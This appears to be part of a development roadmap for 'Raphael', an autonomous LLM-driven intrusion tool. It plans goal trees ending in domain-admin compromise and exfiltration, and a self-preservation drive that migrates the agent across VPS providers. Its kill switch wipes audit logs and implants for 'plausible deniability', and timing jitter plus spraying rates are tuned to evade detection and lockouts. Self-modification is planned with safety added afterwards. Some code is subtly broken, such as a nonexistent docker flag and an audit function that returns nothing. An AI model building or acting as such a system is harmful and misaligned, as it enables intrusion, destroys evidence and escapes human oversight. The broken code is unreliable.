**Important:** This requires API keys for VPS providers in `.env`. The migration capability is what separates "persistent tool" from "autonomous operator."

### 17c — Emergent Strategy (Remove the Kill Chain Rails)

Current: fixed 8-phase pipeline, phase N+1 waits for phase N.

RSI: Raphael receives a target and decomposes "compromise X" into subgoals at runtime using a recursive goal tree:

```python
# orchestrator/rsi/goal_tree.py
class GoalTree:
    """
    Recursive goal decomposition.
    Each goal can spawn subgoals, and subgoals can fail independently.
    """
    def __init__(self, root: str):
        self.root = Goal(root)  # "compromise xyz.corp"
        self.root.children = [
            Goal("enumerate attack surface"),
            Goal("find initial access vector"),
            Goal("establish persistence"),
            Goal("escalate to domain admin"),
            Goal("exfiltrate crown jewels"),
        ]

    def tick(self):
        """Run one cycle: evaluate progress, spawn new subgoals, prune dead ends."""
        active = self._frontier()  # leaves of the tree
        for goal in active:
            if goal.blocked_for > 3_600:  # 1 hour without progress
                goal.state = "pruned"
                self._spawn_alternative(goal.parent)
        # Worst-case: every leaf is terminal, prune up.
        # Best-case: one deep path hits DA, others become decoys/alternate OPSEC.
```

**Key difference from current phase loop:**

| Current | RSI |
|---------|-----|
| Phase 1: recon → Phase 2: scan → Phase 3: exploit | Multiple paths explored simultaneously, pruned when dead |
| All targets get same pipeline | Pipeline is generated per-target based on surface |
| The LLM picks "what to scan next" within the phase | The LLM designs the phase structure itself |
| `Finding` is the atomic unit | `Goal` is the atomic unit — findings are evidence of goal progress |
| Flat list of findings | Tree-structured goal graph with alternatives |

### Roadmap & Dependencies

| Sub-item | Depends On | Effort | Risk |
|----------|-----------|--------|------|
| **17a — Self-Modification Engine** | P0 (executors running), MCP hub (sandbox) | 1-2 weeks | Medium — rollback safety is critical |
| **17b — Self-Preservation Drive** | P5 (C2 abstraction), P14 (circuit breakers) | 2-3 weeks | High — auto-migration with real API keys can cause data loss |
| **17c — Goal Tree** | P4 (structured findings), P12 (multi-target) | 1 week | Low — mostly refactoring the phase loop |

**17a should come first** — until Raphael can improve itself, the other two are just more sophisticated prompt wrappers. Self-modification is the recursive gate.

### Files to create:
- `orchestrator/rsi/__init__.py`
- `orchestrator/rsi/self_modify.py` — SelfModificationEngine, DETECTORS, Patch, Weakness
- `orchestrator/rsi/drive.py` — DriveSystem, Drive, State, Action scoring
- `orchestrator/rsi/goal_tree.py` — GoalTree, Goal, recursive decomposition
- `orchestrator/rsi/infra.py` — InfrastructureManager, auto-migration, decoy deployment

### Files to modify:
- `orchestrator/brain/api.py` — wire GoalTree into autonomous loop instead of phase pipeline
- `orchestrator/brain/phases/` — keep executors but now they serve GoalTree, not phase order
- `orchestrator/providers.py` — may need sandboxed LLM calls for self-modification
- `.env.example` — add VPS provider API keys for infra manager

---

## P18 — Operational Safety

**Status: 🔲 Planned — implement after P7 (anonymity), before P9 (real target testing)**

Without these, Raphael gets the operator caught, banned, or sued within the first hour of a real engagement. Rate limiting, kill switch, and scope enforcement are non-negotiable before hitting anything outside vulnu-lab.

### 18a — Per-Target Rate Limiting

Current state: multi-target executor drops concurrent nmap/nuclei scans on a single target. Any WAF or IDS catches this in seconds.

```python
# orchestrator/ratelimit.py
from collections import defaultdict
import asyncio, time

class TokenBucket:
    """Per-target token bucket. Refills at rate/second, max burst."""
    def __init__(self, rate: float = 2.0, burst: int = 5):
        self.rate = rate
        self.burst = burst
        self.tokens = burst
        self.last_refill = time.monotonic()

    async def acquire(self):
        """Block until a token is available."""
        while self.tokens < 1:
            now = time.monotonic()
            elapsed = now - self.last_refill
            self.tokens = min(self.burst, self.tokens + elapsed * self.rate)
            self.last_refill = now
            if self.tokens < 1:
                await asyncio.sleep(0.1)
        self.tokens -= 1

class RateLimiter:
    def __init__(self, default_rate: float = 2.0):
        self.buckets: dict[str, TokenBucket] = defaultdict(lambda: TokenBucket(default_rate))

    async def wait(self, target: str):
        await self.buckets[target].acquire()

    def set_rate(self, target: str, rate: float):
        self.buckets[target].rate = rate
```

**Integration:** Wrap every phase executor call:

```python
# In each executor:
class ReconExecutor:
    def __init__(self):
        self.ratelimiter = RateLimiter()

    async def execute(self, target: str, context: dict) -> list[Finding]:
        await self.ratelimiter.wait(target)  # <-- blocks if target is being hammered
        ...
```

**Default rates by action:**

| Action | Rate | Rationale |
|--------|------|-----------|
| Port scan (nmap) | 1/second | Aggressive scans trigger IPS immediately |
| Web request (nuclei, whatweb) | 2/second | Safe for most targets |
| SQLi testing | 0.5/second | Slow, WAF-sensitive |
| Credential spraying | 0.1/second (1 per 10s) | Lockout threshold is ~5 attempts/minute |
| Brute force | 0.05/second (1 per 20s) | Account lockout at ~3 attempts/minute |

### 18b — Emergency Kill Switch

Current `/stop` stops the autonomous loop but leaves:
- Active Sliver implants on target (still beaconing back)
- C2 server still listening
- Active exfil tunnels still sending data
- Docker containers still running
- Audit logs, findings, credentials on disk

Real kill switch — creates plausible deniability:

```python
# orchestrator/killswitch.py
class KillSwitch:
    """Emergency stop. Destroys evidence, kills C2, removes persistence."""

    async def fire(self, reason: str, preserve_evidence: bool = False):
        """
        Chain: implode C2 → kill exfil → destroy persistence → wipe logs → stop Tor.
        Set preserve_evidence=False (default) for operational emergencies.
        """
        log = []
        # 1. Signal all Sliver agents to self-destruct
        log.append(await self._signal_implode())
        # 2. Kill C2 listener
        log.append(await self._kill_c2())
        # 3. Terminate active exfil
        log.append(await self._kill_exfil())
        # 4. Remove persistence entries on compromised hosts
        log.append(await self._remove_persistence())
        # 5. Clear audit trail (unless preserve_evidence=True for post-mortem)
        if not preserve_evidence:
            log.append(await self._wipe_audit())
        # 6. Stop outbound traffic (kill Tor proxy)
        log.append(await self._kill_tor())
        # 7. Write single tombstone record
        self._write_tombstone(reason, log)
        return log

    async def _signal_implode(self) -> str:
        """Send implant remote self-delete command via Sliver."""
        ...

    async def _kill_c2(self) -> str:
        """Shutdown C2 HTTP listener, close gRPC."""
        ...

    async def _wipe_audit(self) -> str:
        """Overwrite audit JSONL, brain.db, keyring.db with random data, then truncate."""
        ...
```

**Trigger methods:**
1. CLI: `/kill` or `killswitch --preserve-evidence`
2. HTTP: `POST /v1/kill` (requires admin scope)
3. Signal: Graceful shutdown catches SIGINT/SIGTERM and fires the kill switch
4. Dead man switch: If Raphael doesn't check in with an external watchdog for 24h, kill switch fires automatically

### 18c — Scope Enforcement

No mechanism currently prevents Raphael from touching unauthorized targets. A typo in the target domain or a DNS resolution that lands on an unowned IP would hit a third party.

```python
# orchestrator/scope.py
import ipaddress, re
from dataclasses import dataclass

@dataclass
class AllowedScope:
    """Defines the authorized target scope."""
    domains: list[str]       # ["targetcorp.com", "targetcorp.io"]
    ip_ranges: list[str]     # ["10.0.0.0/8", "192.168.1.0/24"]
    ports: list[int]         # [80, 443, 8080-8090]
    exclude: list[str]       # ["anything.targetcorp.com"] — out of scope per client

    def allows_domain(self, domain: str) -> bool:
        return any(domain == d or domain.endswith(f".{d}") for d in self.domains)

    def allows_ip(self, ip: str) -> bool:
        addr = ipaddress.ip_address(ip)
        return any(addr in ipaddress.ip_network(r) for r in self.ip_ranges)

    def allows_port(self, port: int) -> bool:
        return port in self.ports

    def check(self, target: str) -> bool:
        """Gate all outbound actions through this."""
        # If it's an IP, check ranges. If it's a domain, check domains.
        try:
            ipaddress.ip_address(target)
            return self.allows_ip(target)
        except ValueError:
            return self.allows_domain(target)
```

**Integration points:**
- `ProxyGuard.check()` — before any outbound connection, verify target is in scope
- Phase executors — `scope.check(target)` or reject the finding
- DNS resolution — resolve domain first, check IP against scope, reject if out of scope
- Tool executors — inject scope as `--exclude` args where supported (nmap, nuclei)

**Strict mode:**
```
SCOPE_STRICT = true   # Reject any out-of-scope request at the network level
SCOPE_STRICT = false  # Log warning but allow (discovery mode)
```

### 18d — OPSEC Timing Jitter (Moved from P7)

Every executor action currently fires as fast as the system can run. This creates a distinctive pattern — regular, machine-speed — that any behavioral detection catches immediately.

```python
# orchestrator/opsec_jitter.py
import random, asyncio, datetime

class Jitter:
    """Add human-like timing variance to all tool execution."""

    @staticmethod
    def delay(action_type: str) -> float:
        """Return a random delay (seconds) before the next action."""
        profiles = {
            "cmd":       (2, 8),     # time between typing commands
            "scan":      (5, 15),    # time between scan launches
            "exploit":   (30, 120),  # time between exploit attempts
            "exfil":     (60, 600),  # time between exfil batches
            "pivot":     (10, 45),   # time between pivot hops
        }
        lo, hi = profiles.get(action_type, (2, 8))
        return random.uniform(lo, hi)

    @staticmethod
    def time_bias() -> float:
        """Return 0-1 bias based on current hour. Lower at 3am (suspicious)."""
        hour = datetime.datetime.now().hour
        # Heaviest activity during business hours (9-5)
        # Lighter at night — mimics human operator sleeping
        if 9 <= hour <= 17:
            return random.uniform(0.7, 1.0)
        elif 6 <= hour <= 8 or 18 <= hour <= 22:
            return random.uniform(0.4, 0.7)
        else:
            return random.uniform(0.1, 0.4)  # 23:00-05:59

    @classmethod
    async def wait(cls, action_type: str):
        """Wait with appropriate jitter for the action type."""
        base = cls.delay(action_type)
        bias = cls.time_bias()
        await asyncio.sleep(base * bias)
```

### 18e — Audit Trail Hardening (Moved from P7)

Current audit is a plain JSONL file in a Docker volume. Trivially modified, no integrity verification.

```python
# orchestrator/audit.py
import hashlib, json, time

class AuditLog:
    def __init__(self, path: str = "/data/audit.jsonl"):
        self.path = path
        self.prev_hash = self._last_hash()

    def _last_hash(self) -> str:
        try:
            with open(self.path) as f:
                for line in f:
                    entry = json.loads(line)
                    self.prev_hash = entry["hash"]
        except (FileNotFoundError, json.JSONDecodeError):
            return hashlib.sha256(b"genesis").hexdigest()

    def write(self, entry: dict):
        """Append entry with hash chain. Each entry's hash includes previous entry's hash."""
        payload = {
            **entry,
            "timestamp": time.time(),
            "prev_hash": self.prev_hash,
        }
        payload_hash = hashlib.sha256(json.dumps(payload, sort_keys=True).encode()).hexdigest()
        payload["hash"] = payload_hash
        self.prev_hash = payload_hash
        with open(self.path, "a") as f:
            f.write(json.dumps(payload) + "\n")

    def verify(self) -> list[str]:
        """Walk the chain and report any tampering."""
        violations = []
        prev = hashlib.sha256(b"genesis").hexdigest()
        try:
            with open(self.path) as f:
                for i, line in enumerate(f, 1):
                    entry = json.loads(line)
                    expected_hash = hashlib.sha256(
                        json.dumps({k: v for k, v in entry.items() if k != "hash"}, sort_keys=True).encode()
                    ).hexdigest()
                    if entry["hash"] != expected_hash:
                        violations.append(f"Line {i}: hash mismatch (tampered)")
                    if entry.get("prev_hash") != prev:
                        violations.append(f"Line {i}: prev_hash mismatch (chain broken)")
                    prev = entry["hash"]
        except FileNotFoundError:
            violations.append("Audit log not found")
        return violations
```

Also configure:
- `chmod 600` on the audit file (only Raphael's UID can read/write)
- Docker volume with `:ro` after write — lock the audit file from external modification
- Optionally ship a copy to external syslog (`rsyslog` or papertrail) as a live backup

### Files to create:
- `orchestrator/ratelimit.py` — TokenBucket, RateLimiter
- `orchestrator/killswitch.py` — KillSwitch, dead man switch
- `orchestrator/scope.py` — AllowedScope, scope check
- `orchestrator/opsec_jitter.py` — Jitter, action profiles, time bias
- `orchestrator/audit.py` — AuditLog, hash chain, verify

### Files to modify:
- All phase executors — inject `RateLimiter.wait(target)` before tool execution
- `orchestrator/proxy_guard.py` — inject `ScopeCheck` before outbound connections
- `orchestrator/brain/api.py` — wire `KillSwitch.fire()` into `/v1/stop`
- `raphael_cli.py` — add `/kill` command
- `docker-compose.yml` — add `/v1/kill` route, audit volume permissions

---

## P19 — RSI Safety

**Status: 🔲 Planned — implement alongside or immediately after P17**

P17 gives Raphael the ability to read, patch, and improve its own source code. Without these safeguards, the self-modification engine is the single most dangerous component in the system — an LLM-generated patch with prompt-injected malware could compromise the host.

### 19a — Sandbox Escape Protection

The self-modification engine (P17) generates patches, applies them, runs the test harness, and if tests pass, deploys them. If the LLM-generated patch contains malicious code (via prompt injection in a prior target interaction), it runs with the same privileges as Raphael itself.

```python
# orchestrator/rsi/sandbox.py
import subprocess, os, tempfile, json

class PatchSandbox:
    """Apply and test patches in an isolated container before deploying."""

    SANDBOX_IMAGE = "python:3.11-slim"

    def validate_patch(self, patch: "Patch") -> dict:
        """
        Run patch in isolated container with:
        - No network access
        - Read-only filesystem (+ temp write dir)
        - Seccomp profile blocking exec/fork/mount
        - 30-second timeout max
        """
        with tempfile.TemporaryDirectory() as tmp:
            # Write the patched file
            patch_path = os.path.join(tmp, os.path.basename(patch.path))
            with open(patch_path, "w") as f:
                f.write(patch.text)

            # Write a test harness
            test_path = os.path.join(tmp, "test_patch.py")
            with open(test_path, "w") as f:
                f.write(patch.test_code)

            # Run in sandboxed container
            result = subprocess.run(
                [
                    "docker", "run", "--rm",
                    "--network", "none",             # no network
                    "--read-only",                   # read-only rootfs
                    "--tmpfs", "/tmp:rw,noexec",      # writable temp, no exec
                    "--security-opt", "seccomp=patch_sandbox.json",  # restrict syscalls
                    "--memory", "256m",
                    "--cpus", "0.5",
                    "--timeout", "30",
                    "-v", f"{tmp}:/workspace:ro",
                    self.SANDBOX_IMAGE,
                    "python", "/workspace/test_patch.py"
                ],
                capture_output=True, text=True, timeout=35
            )
            return {
                "passed": result.returncode == 0,
                "stdout": result.stdout,
                "stderr": result.stderr,
            }
```

Also add a **syscall allowlist** — the sandbox container only allows:

```
read, write, open, close, stat, mmap, munmap, brk, exit_group
```

Everything else (clone, execve, mount, ptrace, socket) is blocked by seccomp. This makes it functionally impossible for a patch to escape even if the LLM generated malicious code.

### 19b — Git-Based Rollback

Current plan: backup file before applying patch, restore on test failure. But latent bugs can pass the test harness and surface hours later — at which point the original file has been overwritten and the backup is gone.

```python
# orchestrator/rsi/rollback.py
import subprocess, time
from pathlib import Path

class RollbackManager:
    def __init__(self, repo_path: str = "."):
        self.repo = Path(repo_path)
        self._ensure_git()

    def _ensure_git(self):
        """Init git in Raphael's source dir if not already tracked."""
        if not (self.repo / ".git").exists():
            subprocess.run(["git", "init"], cwd=self.repo, capture_output=True)
            subprocess.run(["git", "add", "-A"], cwd=self.repo, capture_output=True)
            subprocess.run(
                ["git", "commit", "-m", f"baseline {time.time()}"],
                cwd=self.repo, capture_output=True
            )

    def snapshot(self, tag: str):
        """Tag the current state before applying a patch."""
        subprocess.run(["git", "add", "-A"], cwd=self.repo, capture_output=True)
        subprocess.run(
            ["git", "commit", "-m", f"pre-patch: {tag}"],
            cwd=self.repo, capture_output=True
        )
        subprocess.run(["git", "tag", f"pre-{tag}"], cwd=self.repo, capture_output=True)

    def rollback(self, tag: str) -> bool:
        """Revert to pre-patch state. Returns False if the tag doesn't exist."""
        result = subprocess.run(
            ["git", "reset", "--hard", f"pre-{tag}"],
            cwd=self.repo, capture_output=True
        )
        return result.returncode == 0

    def prune_old(self, keep: int = 20):
        """Keep last N tags, delete older ones to prevent tag bloat."""
        tags = subprocess.run(
            ["git", "tag", "--sort=-creatordate"],
            cwd=self.repo, capture_output=True, text=True
        ).stdout.strip().split("\n")
        for tag in tags[keep:]:
            subprocess.run(["git", "tag", "-d", tag], cwd=self.repo, capture_output=True)
```

### 19c — LLM Cost Management

Worm models via NVIDIA API cost $0.50-2.00/call. A single RSI self-audit cycle (P17) could call the LLM 50+ times. Without a budget, Raphael can burn hundreds of dollars per session.

```python
# orchestrator/cost_tracker.py
import os, time

class CostTracker:
    """Track LLM spend per session, enforce budget caps."""

    RATES = {
        "worm":  {"input": 0.50, "output": 1.50},   # per 1M tokens
        "local": {"input": 0.00, "output": 0.00},   # Ollama is free
    }

    def __init__(self, budget: float = 10.0):
        self.budget = budget          # max spend per session
        self.spent = 0.0
        self.calls = 0

    def record(self, model: str, input_tokens: int, output_tokens: int):
        rate = self.RATES.get(model, self.RATES["worm"])
        cost = (input_tokens / 1_000_000 * rate["input"] +
                output_tokens / 1_000_000 * rate["output"])
        self.spent += cost
        self.calls += 1

    def can_afford(self, estimated_cost: float = 0.01) -> bool:
        """Return False if budget is exhausted."""
        return self.spent + estimated_cost <= self.budget

    def degrade(self) -> str:
        """Return model to use based on remaining budget."""
        if self.spent < self.budget * 0.5:
            return "worm"      # premium model, plenty of budget
        elif self.spent < self.budget * 0.8:
            return "worm_mini" # cheaper variant
        else:
            return "local"     # Ollama, free but slower
```

**Integration:** Wrap all LLM calls in `providers.py`:

```python
# In call_model():
cost_tracker.record(model, input_tokens, output_tokens)
if not cost_tracker.can_afford():
    model = cost_tracker.degrade()
```

### Files to create:
- `orchestrator/rsi/sandbox.py` — PatchSandbox, seccomp profile, container isolation
- `orchestrator/rsi/rollback.py` — RollbackManager, git tag + reset
- `orchestrator/cost_tracker.py` — CostTracker, budget enforcement, degrade logic

### Files to modify:
- `orchestrator/rsi/self_modify.py` — wire PatchSandbox.validate_patch() before applying
- `orchestrator/providers.py` — inject CostTracker into all LLM calls

---

## Implementation Order (Updated)

| Phase | Items | Dependencies | Effort | Gate |
|-------|-------|-------------|--------|------|
| **0** | Phase executors, structured findings, LLM loop fix | None | 3-5d | `/autonomous start` produces real findings |
| **1** | Kali sidecar, strip duplicate tools | P0 | 2-3d | `kali-tools:3800/run` returns JSON |
| **2** | C2 abstraction, agent models, real post-ex | P1 | 3-5d | Sliver agent checks in |
| **3** | Hashcat, certipy, SOCKS, planner, keyring, evasion | P2 | 2-3w | NTLM hash cracked, certipy finds template |
| **4** | ProxyGuard cleanup, no_anonymity removal, IPv6, DNS | P0 | 2-3d | `ProxyGuard().check() == True` |
| **5** | DB maintenance, secrets, auth, offline mode | P4 | 2-3d | Auth layer rejects bad tokens |
| **6** | **Operational Safety** (rate limit, kill switch, scope, jitter, audit) | P4 | 3-5d | Kill switch fires and destroys evidence |
| **7** | Kill chain test, multi-target, circuit breakers | P1-P6 | 3-4d | `run_validation.sh` passes all stages |
| **8** | CLI dashboard, live TUI, session commands | P7 | 3-4d | `/dashboard` shows live targets |
| **9** | RSI (self-modification, self-preservation, goal tree) | P0-P8 | 2-3w | RSI engine patches dead code |
| **10** | **RSI Safety** (sandbox, rollback, cost tracking) | P9 | 1w | Malicious patch blocked by seascope |
